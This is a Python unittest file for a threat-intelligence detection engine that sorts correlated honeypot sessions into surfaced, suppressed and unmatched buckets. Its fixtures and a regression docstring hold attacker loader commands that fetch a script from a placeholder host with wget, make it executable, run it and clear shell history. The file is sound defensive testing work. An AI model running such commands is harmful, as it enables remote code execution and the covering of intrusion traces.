"""
tests/test_detection.py — the Detection layer's contract.

Run:  python3 -m unittest discover -s tests -v     (from the repo root)

stdlib unittest on purpose: the repo has no pytest and no tests/ directory yet,
and a new test layer should not also be a new dependency.

These tests pin the guarantees that make Detection auditable -- nothing is
dropped, suppression beats surfacing, every verdict states a reason, and
correlation's output is never mutated. Rules are fed in from temporary YAML so
the tests check the ENGINE, not whatever policy detection_rules.yml currently
holds; policy is meant to change without breaking tests.
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from threat_intel import detection  # noqa: E402


def rel(link_type="same_sequence", members=2, sources=1, scope=("sensor-a",),
        value="k"):
    """A correlation-shaped relationship. Mirrors correlation._relationship."""
    return {
        "link_type": link_type,
        "link_value": value,
        "statement": "these sessions share an identical observed command sequence",
        "members": [f"s{i}" for i in range(members)],
        "member_count": members,
        "distinct_sources": sources,
        "src_ips": [f"10.0.0.{i}" for i in range(sources)],
        "first_seen": "2026-01-01 00:00:00",
        "last_seen": "2026-01-01 00:01:00",
        "scope": list(scope),
    }


class RuleFileMixin:
    """Writes a throwaway ruleset and points detect() at it."""

    def rules_file(self, body: str) -> str:
        fh = tempfile.NamedTemporaryFile("w", suffix=".yml", delete=False,
                                         encoding="utf-8")
        fh.write(body)
        fh.close()
        self.addCleanup(os.unlink, fh.name)
        detection.load_rules(fh.name, force=True)   # bypass the module cache
        return fh.name

    def tearDown(self):
        detection.load_rules(detection.RULES_PATH, force=True)   # restore


SURFACE_CROSS_SOURCE = """
rules:
  - id: cross-source
    title: Across sources
    description: Holds across more than one source address.
    when:
      min_distinct_sources: 2
"""


class TestNothingIsDiscarded(RuleFileMixin, unittest.TestCase):
    """The central guarantee: detection filters the VIEW, never the evidence."""

    def test_every_relationship_lands_in_exactly_one_bucket(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE)
        rels = [rel(sources=3), rel(sources=1), rel(sources=1, members=9)]
        out = detection.detect(rels, path=path)

        total = len(out["detections"]) + len(out["suppressed"]) + len(out["unmatched"])
        self.assertEqual(total, out["evaluated"])
        self.assertEqual(out["evaluated"], 3)

    def test_unmatched_relationships_are_returned_not_dropped(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE)
        out = detection.detect([rel(sources=1)], path=path)

        self.assertEqual(len(out["detections"]), 0)
        self.assertEqual(len(out["unmatched"]), 1)
        self.assertIn("not a judgement", out["unmatched"][0]["reason"])

    def test_relationship_is_embedded_unmodified(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE)
        original = rel(sources=4)
        snapshot = dict(original)
        out = detection.detect([original], path=path)

        self.assertEqual(out["detections"][0]["relationship"], snapshot)
        self.assertEqual(original, snapshot)      # correlation output untouched


class TestEveryVerdictExplainsItself(RuleFileMixin, unittest.TestCase):

    def test_detection_carries_the_rule_that_fired(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE)
        out = detection.detect([rel(sources=2)], path=path)
        d = out["detections"][0]

        self.assertEqual(d["rules"][0]["id"], "cross-source")
        self.assertTrue(d["reason"])

    def test_no_verdict_in_any_bucket_lacks_a_reason(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE + """
  - id: hide-source-links
    action: suppress
    description: Restates the source grouping.
    when:
      link_type_in: [same_source_address]
""")
        out = detection.detect(
            [rel(sources=5), rel(link_type="same_source_address"), rel(sources=1)],
            path=path)

        for bucket in ("detections", "suppressed", "unmatched"):
            for v in out[bucket]:
                self.assertTrue(v["reason"].strip(),
                                f"{bucket} verdict has no reason")


class TestSuppressionBeatsSurfacing(RuleFileMixin, unittest.TestCase):

    def test_suppress_wins_even_when_a_surface_rule_also_fires(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE + """
  - id: hide-source-links
    action: suppress
    description: Restates the source grouping.
    when:
      link_type_in: [same_source_address]
""")
        # Fires both rules: many sources AND a suppressed link type.
        out = detection.detect([rel(link_type="same_source_address", sources=9)],
                               path=path)

        self.assertEqual(len(out["detections"]), 0)
        self.assertEqual(len(out["suppressed"]), 1)
        self.assertEqual(out["suppressed"][0]["rules"][0]["id"], "hide-source-links")


class TestConditions(RuleFileMixin, unittest.TestCase):

    def test_min_and_max_members(self):
        path = self.rules_file("""
rules:
  - id: mid-band
    description: Between three and five members.
    when:
      min_members: 3
      max_members: 5
""")
        counts = [2, 3, 5, 6]
        out = detection.detect([rel(members=c) for c in counts], path=path)
        surfaced = {d["relationship"]["member_count"] for d in out["detections"]}
        self.assertEqual(surfaced, {3, 5})

    def test_conditions_are_anded_not_ored(self):
        path = self.rules_file("""
rules:
  - id: both
    description: Needs many members AND many sources.
    when:
      min_members: 10
      min_distinct_sources: 3
""")
        out = detection.detect([
            rel(members=50, sources=1),    # members only
            rel(members=2, sources=9),     # sources only
            rel(members=50, sources=9),    # both
        ], path=path)

        self.assertEqual(len(out["detections"]), 1)
        self.assertEqual(out["detections"][0]["relationship"]["member_count"], 50)
        self.assertEqual(out["detections"][0]["relationship"]["distinct_sources"], 9)

    def test_min_distinct_scopes_counts_sensors(self):
        path = self.rules_file("""
rules:
  - id: multi-sensor
    description: Seen on more than one sensor.
    when:
      min_distinct_scopes: 2
""")
        out = detection.detect([
            rel(scope=("sensor-a",)),
            rel(scope=("sensor-a", "sensor-b")),
        ], path=path)
        self.assertEqual(len(out["detections"]), 1)
        self.assertEqual(out["detections"][0]["relationship"]["scope"],
                         ["sensor-a", "sensor-b"])

    def test_missing_fields_fail_the_rule_rather_than_crashing(self):
        path = self.rules_file(SURFACE_CROSS_SOURCE)
        bare = {"link_type": "same_sequence", "members": ["a", "b"]}
        out = detection.detect([bare], path=path)      # no distinct_sources key
        self.assertEqual(len(out["unmatched"]), 1)


class TestMalformedRulesAreSkippedLoudly(RuleFileMixin, unittest.TestCase):

    def test_unknown_condition_is_skipped_and_recorded(self):
        path = self.rules_file("""
rules:
  - id: typo
    description: Uses a condition that does not exist.
    when:
      min_disinct_sources: 2
  - id: good
    description: Holds across more than one source address.
    when:
      min_distinct_sources: 2
""")
        ids = {r["id"] for r in detection.load_rules(path, force=True)}
        self.assertEqual(ids, {"good"})
        self.assertIn("typo", dict(detection.load_errors(path)))

    def test_rule_without_a_description_is_rejected(self):
        """A rule that cannot explain itself must never produce a finding."""
        path = self.rules_file("""
rules:
  - id: silent
    when:
      min_members: 2
""")
        self.assertEqual(detection.load_rules(path, force=True), [])

    def test_bad_action_is_rejected(self):
        path = self.rules_file("""
rules:
  - id: weird
    action: escalate
    description: Not a supported action.
    when:
      min_members: 2
""")
        self.assertEqual(detection.load_rules(path, force=True), [])


class TestOrdering(RuleFileMixin, unittest.TestCase):

    def test_detections_follow_rule_file_order_then_member_count(self):
        path = self.rules_file("""
rules:
  - id: first-rule
    description: Across sources.
    when:
      min_distinct_sources: 2
  - id: second-rule
    description: Many members.
    when:
      min_members: 100
""")
        out = detection.detect([
            rel(members=500, sources=1),   # second-rule only
            rel(members=2, sources=2),     # first-rule
            rel(members=9, sources=2),     # first-rule, more members
        ], path=path)

        got = [(d["rules"][0]["id"], d["relationship"]["member_count"])
               for d in out["detections"]]
        self.assertEqual(got, [("first-rule", 9), ("first-rule", 2),
                               ("second-rule", 500)])


class TestEvidenceConditions(RuleFileMixin, unittest.TestCase):
    """Conditions on WHAT is shared, not just how many share it."""

    @staticmethod
    def seq(length=3, distinct=3, tactics=("Discovery",), techs=("T1083",)):
        r = rel(link_type="same_sequence")
        r["evidence"] = {"sequence_length": length,
                         "distinct_commands": distinct,
                         "tactics": list(tactics),
                         "technique_ids": list(techs),
                         "sample": ["ls"] * min(length, 12)}
        return r

    def test_repeated_single_command_is_suppressed_generically(self):
        """The `ls ls ls` case — killed without naming `ls`."""
        path = self.rules_file("""
rules:
  - id: trivial
    action: suppress
    description: One command repeated.
    when:
      link_type_in: [same_sequence]
      max_distinct_commands: 1
  - id: cross-source
    description: Across sources.
    when:
      min_distinct_sources: 2
""")
        noise = self.seq(length=5, distinct=1)      # ls ls ls ls ls
        noise["distinct_sources"] = 9               # would otherwise surface
        real = self.seq(length=5, distinct=5)
        real["distinct_sources"] = 9

        out = detection.detect([noise, real], path=path)
        self.assertEqual(len(out["suppressed"]), 1)
        self.assertEqual(out["suppressed"][0]["rules"][0]["id"], "trivial")
        self.assertEqual(len(out["detections"]), 1)
        self.assertEqual(out["detections"][0]["relationship"]["evidence"]["distinct_commands"], 5)

    def test_one_row_loader_script_is_not_mistaken_for_noise(self):
        """Regression, found on the real corpus.

        A command row can hold a whole chained script, so a full loader
        (`cd /tmp || ...; wget ...; chmod +x ...; sh ...; history -c`) scores
        distinct_commands = 1 exactly like a repeated `ls`. Counting commands
        alone suppressed a genuine 22-member loader relationship. The tactic
        condition is what tells them apart, so the shipped rule requires both.
        """
        path = self.rules_file("""
rules:
  - id: trivial
    action: suppress
    description: One command, one tactic.
    when:
      link_type_in: [same_sequence]
      max_distinct_commands: 1
      max_distinct_tactics: 1
""")
        noise = self.seq(length=3, distinct=1, tactics=("Discovery",),
                         techs=("T1083",))
        loader = self.seq(length=1, distinct=1,
                          tactics=("Execution", "Command and Control",
                                   "Stealth", "Defense Impairment"),
                          techs=("T1105", "T1059.004", "T1070.003"))

        out = detection.detect([noise, loader], path=path)
        self.assertEqual([v["relationship"]["evidence"]["tactics"]
                          for v in out["suppressed"]], [["Discovery"]])
        self.assertEqual(len(out["unmatched"]), 1, "loader must survive")

    def test_single_tactic_alone_does_not_suppress(self):
        """The tactic condition on its own is too blunt: a multi-command
        download chain can still tag to a single tactic."""
        path = self.rules_file("""
rules:
  - id: trivial
    action: suppress
    description: One command, one tactic.
    when:
      link_type_in: [same_sequence]
      max_distinct_commands: 1
      max_distinct_tactics: 1
""")
        # cd ×5 + wget -> 6 distinct commands, but one tactic.
        download = self.seq(length=6, distinct=6,
                            tactics=("Command and Control",), techs=("T1105",))
        out = detection.detect([download], path=path)
        self.assertEqual(len(out["suppressed"]), 0)

    def test_any_tactics_and_any_techniques_match_the_mitre_layer(self):
        path = self.rules_file("""
rules:
  - id: impactful
    description: Sequence reached Impact.
    when:
      any_tactics: [Impact]
  - id: loader
    description: Sequence used ingress tool transfer.
    when:
      any_techniques: [T1105]
""")
        out = detection.detect([
            self.seq(tactics=("Impact",), techs=("T1531",)),
            self.seq(tactics=("Discovery",), techs=("T1105",)),
            self.seq(tactics=("Discovery",), techs=("T1083",)),
        ], path=path)
        fired = {d["rules"][0]["id"] for d in out["detections"]}
        self.assertEqual(fired, {"impactful", "loader"})
        self.assertEqual(len(out["unmatched"]), 1)

    def test_min_sequence_length_and_distinct_techniques(self):
        path = self.rules_file("""
rules:
  - id: substantial
    description: A sequence with some shape to it.
    when:
      min_sequence_length: 4
      min_distinct_techniques: 2
""")
        out = detection.detect([
            self.seq(length=2, techs=("T1083", "T1105")),        # too short
            self.seq(length=9, techs=("T1083",)),                # one technique
            self.seq(length=9, techs=("T1083", "T1105")),        # both
        ], path=path)
        self.assertEqual(len(out["detections"]), 1)
        self.assertEqual(out["detections"][0]["relationship"]["evidence"]["sequence_length"], 9)


class TestEvidenceConditionsFailClosed(RuleFileMixin, unittest.TestCase):
    """The trap: a max_* condition read against MISSING evidence would compare
    against zero and match everything it knows nothing about."""

    def test_max_condition_does_not_match_relationships_without_evidence(self):
        path = self.rules_file("""
rules:
  - id: trivial
    action: suppress
    description: One command repeated.
    when:
      max_distinct_commands: 1
""")
        no_ev = rel(link_type="shared_indicator")     # evidence never set
        self.assertIsNone(no_ev.get("evidence"))
        out = detection.detect([no_ev], path=path)

        self.assertEqual(len(out["suppressed"]), 0, "suppressed on unknown evidence")
        self.assertEqual(len(out["unmatched"]), 1)

    def test_explicit_none_evidence_is_also_unknown_not_zero(self):
        path = self.rules_file("""
rules:
  - id: trivial
    action: suppress
    description: One command repeated.
    when:
      max_distinct_tactics: 1
""")
        r = rel(link_type="same_source_address")
        r["evidence"] = None
        out = detection.detect([r], path=path)
        self.assertEqual(len(out["suppressed"]), 0)

    def test_min_condition_also_fails_closed(self):
        path = self.rules_file("""
rules:
  - id: substantial
    description: Long shared sequence.
    when:
      min_sequence_length: 2
""")
        out = detection.detect([rel(link_type="shared_indicator")], path=path)
        self.assertEqual(len(out["detections"]), 0)


class TestCorrelationEvidenceContract(unittest.TestCase):
    """Detection's evidence conditions are only safe if correlation attaches
    evidence to the right strategies — and to no others."""

    def setUp(self):
        from threat_intel import correlation
        self.C = correlation

    def _sessions(self):
        # Two sessions, identical sequences, different source addresses.
        seq = ["cd /tmp", "wget http://x/y.sh", "chmod +x y.sh", "./y.sh"]
        return [
            {"session_id": "a", "src_ip": "10.0.0.1", "instance": "s1",
             "commands_ordered": list(seq), "first_seen": "t0", "last_seen": "t1"},
            {"session_id": "b", "src_ip": "10.0.0.2", "instance": "s1",
             "commands_ordered": list(seq), "first_seen": "t0", "last_seen": "t1"},
        ]

    def test_sequence_links_carry_evidence(self):
        rels = self.C.correlate(sessions=self._sessions())
        seq_links = [r for r in rels if r["link_type"] == "same_sequence"]
        self.assertEqual(len(seq_links), 1)

        ev = seq_links[0]["evidence"]
        self.assertEqual(ev["sequence_length"], 4)
        self.assertEqual(ev["distinct_commands"], 4)
        self.assertIn("sample", ev)

    def test_source_address_links_carry_no_sequence_evidence(self):
        """Members of a src_ip group have DIFFERENT sequences, so publishing
        one member's commands as the group's evidence would be false."""
        sessions = self._sessions()
        sessions[1]["src_ip"] = "10.0.0.1"                  # same source now
        sessions[1]["commands_ordered"] = ["uname -a"]      # different sequence

        rels = self.C.correlate(sessions=sessions)
        ip_links = [r for r in rels if r["link_type"] == "same_source_address"]
        self.assertEqual(len(ip_links), 1)
        self.assertIsNone(ip_links[0]["evidence"])

    def test_indicator_links_carry_no_sequence_evidence(self):
        iocs = [{"type": "url", "value": "http://x/y.sh", "sessions": ["a", "b"]}]
        rels = self.C.correlate(sessions=self._sessions(), indicators=iocs)
        for r in rels:
            if r["link_type"] == "shared_indicator":
                self.assertIsNone(r["evidence"])

    def test_repeated_single_command_reports_one_distinct_command(self):
        sessions = [
            {"session_id": "a", "src_ip": "10.0.0.1", "instance": "s1",
             "commands_ordered": ["ls", "ls", "ls"]},
            {"session_id": "b", "src_ip": "10.0.0.2", "instance": "s1",
             "commands_ordered": ["ls", "ls", "ls"]},
        ]
        rels = self.C.correlate(sessions=sessions)
        seq = [r for r in rels if r["link_type"] == "same_sequence"][0]
        self.assertEqual(seq["evidence"]["sequence_length"], 3)
        self.assertEqual(seq["evidence"]["distinct_commands"], 1)


class TestLayerSeparation(unittest.TestCase):

    def test_detection_never_emits_a_severity_or_a_score(self):
        """Severity belongs to severity.py; scores belong nowhere."""
        out = detection.detect([rel(sources=4), rel(link_type="same_source_address")])
        banned = {"severity", "score", "risk", "risk_score", "weight",
                  "priority", "confidence", "fi", "fi_score", "max_fi"}
        for bucket in ("detections", "suppressed", "unmatched"):
            for v in out[bucket]:
                self.assertEqual(set(v) & banned, set())
                for r in v["rules"]:
                    self.assertEqual(set(r) & banned, set())

    def test_shipped_ruleset_loads_without_errors(self):
        detection.load_rules(detection.RULES_PATH, force=True)
        self.assertEqual(detection.load_errors(), [])
        self.assertTrue(detection.load_rules())

    def test_shipped_ruleset_references_no_dataset_specifics(self):
        """Conditions must stay structural -- no IPs, commands or techniques."""
        allowed_link_types = {"same_sequence", "shared_indicator",
                              "same_source_address", "shared_credential",
                              "temporal_proximity"}
        for r in detection.load_rules(detection.RULES_PATH, force=True):
            for cond, val in r["when"].items():
                if cond == "link_type_in":
                    self.assertTrue(set(val) <= allowed_link_types)
                else:
                    self.assertIsInstance(val, int)


class TestEmptyInput(unittest.TestCase):

    def test_no_relationships_is_a_valid_result(self):
        out = detection.detect([])
        self.assertEqual(out["evaluated"], 0)
        self.assertEqual(out["detections"], [])

    def test_none_is_tolerated(self):
        self.assertEqual(detection.detect()["evaluated"], 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
